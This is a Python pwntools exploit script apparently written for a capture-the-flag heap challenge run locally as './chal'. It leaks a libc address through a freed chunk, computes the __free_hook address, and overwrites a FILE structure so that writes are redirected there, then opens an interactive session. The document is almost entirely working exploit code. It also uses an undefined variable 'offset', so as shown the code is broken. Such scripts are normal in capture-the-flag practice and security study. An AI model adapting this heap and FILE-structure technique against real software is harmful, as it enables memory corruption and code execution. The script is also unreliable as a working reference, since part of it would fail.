import pwn
proc = pwn.process(["./chal"])
def sendindex(idx:int):
    proc.sendlineafter(b"index\n> ", str(idx).encode())

def sendsz(sz:int):
    proc.sendlineafter(b"size\n> ", str(sz).encode())

def add_user(idx:int, username = "a" * 16):
    proc.sendafter(b"> ", b"1")
    sendindex(idx)
    proc.sendafter(b"username\n> ", username.encode())
    proc.recvuntil(b"success!\n")

def edit_user(idx:int, sz:int, data:bytes):
    proc.sendafter(b"> ", b"2")
    sendindex(idx)
    sendsz(sz)
    from time import sleep
    sleep(0.2)
    proc.send(data)
    proc.recvuntil(b"success!\n")

def del_user(idx:int):
    proc.sendafter(b"> ", b"3")
    sendindex(idx)
    proc.recvuntil(b"success!\n")


def main():
    # leaking libc base
    add_user(0)
    edit_user(0, 0x10, b"a"*0x10)
    add_user(1, "b"* 16)
    # 0x30 0x1e0 in tcache
    # 0x1010 in unsorted bin
    del_user(0)
    # obtain previous freed unsorted bin chunk
    edit_user(1, 0x199, b"s"*9)
    proc.sendlineafter(b"> ", b"4")
    
    leak_addr = pwn.u64(proc.recvuntil(b"1.")[20:25] + b"\x00" * 3)
    print(f"leaked addr: {hex(leak_addr)}")
    libc_base = leak_addr - (0x7ffff7fbe2 - 0x007ffff7dd1000)
    print(f"libc base: {hex(libc_base)}")
    free_hook = libc_base + 2027080
    print(f"free hook addr: {hex(free_hook)}")
    add_user(2)
    edit_user(2, 24, b"z"*24)
    add_user(3)
    edit_user(3, 24, b"y"*24)
    
    # 0x30 0x1e0 in tcache
    # 1 chunk in unsorted bin
    # 1 chunk in large bin
    del_user(2)
    
    payload = b""
    payload += 0xfbad0000.to_bytes(8, "little")      # flags
    payload += b"\x00" * 8                           # read_ptr 
    payload += b"\x00" * 8                           # read_end
    payload += b"\x00" * 8                           # read_base 
    payload += b"\x00" * 8                           # write_base 
    payload += b"\x00" * 8                           # write_ptr 
    payload += b"\x00" * 8                           # write_end
    payload += (free_hook).to_bytes(8, "little")        # buf_base
    payload += (leak_addr + offset + 0x8).to_bytes(8, "little") # buf_end
    payload += b"\x00" * 8 * 5 # save_base + backup_base + save_end + markers + chain
    payload += int(0).to_bytes(8, "little")          # fd
    # obtain 2's FILE* & set write addr to IO_file_jump
    edit_user(3, 0x1e0 - 16 + 8, payload)
    #input("> b4 send")
    #proc.sendlineafter(b"> ", b"4")
    #proc.sendlineafter(b"data: ", b"j"*8)
    proc.interactive(prompt="")

if __name__ == "__main__":
    main()